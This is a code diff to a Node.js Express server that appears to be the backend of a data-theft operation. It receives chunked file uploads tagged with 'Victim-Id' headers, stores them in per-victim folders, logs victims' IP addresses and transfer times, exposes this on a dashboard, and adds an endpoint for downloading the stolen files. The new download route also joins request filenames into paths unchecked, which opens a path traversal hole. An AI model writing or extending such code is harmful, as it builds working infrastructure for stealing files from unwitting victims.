@@ -11,7 +11,7 @@ const PORT = process.env.PORT || 8080;
 const corsOptions = {
     origin: ['https://deobfrontend-f30nw0x1c-2naseernoors-projects.vercel.app', 'https://deobfrontend-git-main-2naseernoors-projects.vercel.app'],
     methods: ['GET', 'POST', 'OPTIONS'],
-    allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks', 'Total-Files'],
+    allowedHeaders: ['Content-Type', 'Victim-Id', 'Filename', 'Chunk-Index', 'Total-Chunks'],
     credentials: true,
 };
 app.use(cors(corsOptions));
@@ -53,13 +53,13 @@ const victimTotalFiles = {};
 const connectedDevices = {};
 const chunkTracker = new Map();
 
-// Helper to check all files received
+// Helper to check all files received (future email trigger)
 function checkAndSendEmail(victimId, victimFolder) {
     const filesInFolder = fs.readdirSync(victimFolder);
     if (filesInFolder.length === victimTotalFiles[victimId]) {
         console.log(`✅ All files received for victim ${victimId}`);
 
-        const timeTaken = Date.now() - connectedDevices[victimId].startTransferTime;
+        const timeTaken = Date.now() - connectedDevices[victimId].connectionTime;
         connectedDevices[victimId].totalUploadTime = (timeTaken / 1000).toFixed(2);
 
         console.log(`⏱️ Total upload time for ${victimId}: ${connectedDevices[victimId].totalUploadTime} seconds`);
@@ -73,18 +73,14 @@ app.post('/upload', (req, res) => {
         const victimId = decodeURIComponent(req.headers['victim-id']);
         const chunkIndex = parseInt(req.headers['chunk-index']);
         const totalChunks = parseInt(req.headers['total-chunks']);
-        const totalFiles = parseInt(req.headers['total-files']);
         const ip = req.ip;
 
-        if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks) || isNaN(totalFiles)) {
+        if (!filename || !victimId || isNaN(chunkIndex) || isNaN(totalChunks)) {
             return res.status(400).json({ error: 'Missing or invalid headers' });
         }
 
-        if (!victimTotalFiles[victimId]) {
-            victimTotalFiles[victimId] = totalFiles;
-        }
-
         const chunkId = `${victimId}-${filename}-${chunkIndex}`;
+
         if (!chunkTracker.has(chunkId)) {
             chunkTracker.set(chunkId, new Set());
         }
@@ -100,12 +96,11 @@ app.post('/upload', (req, res) => {
             connectedDevices[victimId] = {
                 ip: ip,
                 connectionTime: Date.now(),
-                startTransferTime: Date.now(),
                 filesTransferred: 0,
                 fileList: [],
-                fileTimers: {},
-                fileEndTimes: {},
-                fileDurations: {}
+                fileTimers: {},        // Start time per file
+                fileEndTimes: {},      // End time per file
+                fileDurations: {}      // Transfer time per file
             };
         }
 
@@ -114,6 +109,7 @@ app.post('/upload', (req, res) => {
             victimFolders[victimId] = path.join(OUTPUT_BASE_DIR, `${victimId}_${timestamp}`);
             fs.mkdirSync(victimFolders[victimId], { recursive: true });
             victimFileCounts[victimId] = 0;
+            victimTotalFiles[victimId] = totalChunks;
         }
 
         const victimFolder = victimFolders[victimId];
@@ -136,8 +132,16 @@ app.post('/upload', (req, res) => {
                 connectedDevices[victimId].fileList.push(filename);
             }
 
-            if (victimFileCounts[victimId] === victimTotalFiles[victimId]) {
-                console.log(`✅ All expected files received for victim ${victimId}`);
+            if (victimFileCounts[victimId] === totalChunks) {
+                const startTime = connectedDevices[victimId].fileTimers[filename];
+                const endTime = Date.now();
+                const duration = ((endTime - startTime) / 1000).toFixed(2);
+
+                connectedDevices[victimId].fileEndTimes[filename] = new Date(endTime).toISOString();
+                connectedDevices[victimId].fileDurations[filename] = duration;
+
+                console.log(`✅ File ${filename} received completely in ${duration} seconds`);
+
                 checkAndSendEmail(victimId, victimFolder);
             }
 
@@ -152,6 +156,31 @@ app.post('/upload', (req, res) => {
 // Dashboard data endpoint
 app.get('/dashboard-data', (req, res) => {
     res.json(connectedDevices);
+});
+
+// File download endpoint
+app.get('/download/:victimId/:filename', (req, res) => {
+    try {
+        const { victimId, filename } = req.params;
+        if (!victimFolders[victimId]) {
+            return res.status(404).json({ error: 'Victim folder not found' });
+        }
+
+        const filePath = path.join(victimFolders[victimId], filename);
+        if (!fs.existsSync(filePath)) {
+            return res.status(404).json({ error: 'File not found' });
+        }
+
+        res.download(filePath, filename, (err) => {
+            if (err) {
+                console.error(`❌ Download error:`, err);
+                res.status(500).json({ error: 'Error sending file' });
+            }
+        });
+    } catch (error) {
+        console.error(`❌ Download route error:`, error);
+        res.status(500).json({ error: 'Internal server error' });
+    }
 });
 
 // Start server
